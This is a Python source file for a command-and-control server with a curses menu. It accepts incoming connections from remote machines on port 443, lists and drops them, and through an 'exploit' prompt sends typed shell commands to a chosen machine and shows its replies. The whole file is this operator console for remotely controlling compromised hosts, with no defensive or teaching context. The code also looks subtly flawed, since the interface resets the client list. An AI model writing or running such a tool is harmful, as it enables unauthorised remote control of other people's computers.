import socket
import sys
import threading
import curses

def create_socket():
    try:
        global host
        global port
        global s
        host = '127.0.0.1'
        port = 443
        s = socket.socket()
        print("Socket server created.")
    except socket.error as e:
        print("Socket creation error: " + str(e))

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as e:
        print("Socket binding error: " + str(e) + "\n" + "Retrying...")
        bind_socket()

def accept_clients():
    global clients
    clients = []
    while True:
        conn, address = s.accept()
        print("Connection has been accepted! | IP " + address[0] + " | Port " + str(address[1]))

        client_id = len(clients) + 1

        clients.append({"id": client_id, "connection": conn, "address": address})

def kick_client(selected_id):
    global clients
    target_client = next((client for client in clients if client["id"] == selected_id), None)
    if target_client:
        target_client["connection"].close()
        clients.remove(target_client)
        print(f"Kicked client{selected_id}.")
    else:
        print("Invalid client ID.")

def curses_interface(stdscr):
    global clients
    clients = []

    while True:
        stdscr.clear()
        stdscr.addstr("1. List Clients\n")
        stdscr.addstr("2. Select Client\n")
        stdscr.addstr("3. Kick Client\n")
        stdscr.addstr("4. Quit\n")
        stdscr.refresh()

        choice = stdscr.getch()

        if choice == ord('1'):
            list_clients(stdscr)
        elif choice == ord('2'):
            select_client(stdscr)
        elif choice == ord('3'):
            kick_client_interface(stdscr)
        elif choice == ord('4'):
            break

def list_clients(stdscr):
    global clients
    stdscr.clear()
    stdscr.addstr("Available clients:\n")
    for client in clients:
        stdscr.addstr(f"ID: {client['id']} | IP: {client['address'][0]} | Port: {client['address'][1]}\n")
    stdscr.refresh()
    stdscr.getch()

def select_client(stdscr):
    global clients
    stdscr.clear()
    stdscr.addstr("Enter client ID to select: ")
    stdscr.refresh()
    client_id = int(stdscr.getstr().decode('utf-8'))

    selected_client = next((client for client in clients if client["id"] == client_id), None)

    if selected_client:
        stdscr.clear()
        stdscr.addstr(f"Selected client{selected_client['id']}. Type 'exploit' to execute commands.\n")
        stdscr.refresh()
        exploit_commands(selected_client, stdscr)
    else:
        stdscr.clear()
        stdscr.addstr("Invalid client ID.\n")
        stdscr.refresh()
        stdscr.getch()

def kick_client_interface(stdscr):
    global clients
    stdscr.clear()
    stdscr.addstr("Enter client ID to kick: ")
    stdscr.refresh()
    selected_id = int(stdscr.getstr().decode('utf-8'))

    kick_client(selected_id)

def exploit_commands(selected_client, stdscr):
    while True:
        stdscr.clear()
        stdscr.addstr(f"client{selected_client['id']} (exploit) >>> ")
        stdscr.refresh()
        cmd = stdscr.getstr().decode('utf-8')

        if cmd.lower() == 'back':
            stdscr.clear()
            stdscr.addstr("Returning to the main command menu.\n")
            stdscr.refresh()
            stdscr.getch()
            break

        send_command(selected_client['connection'], cmd, stdscr)

def send_command(conn, cmd, stdscr):
    conn.send(str.encode(cmd))
    client_response = str(conn.recv(1024), "utf-8")
    stdscr.addstr(client_response)
    stdscr.refresh()
    stdscr.getch()

def main():
    create_socket()
    bind_socket()

    client_thread = threading.Thread(target=accept_clients)
    client_thread.start()

    curses.wrapper(curses_interface)

main()
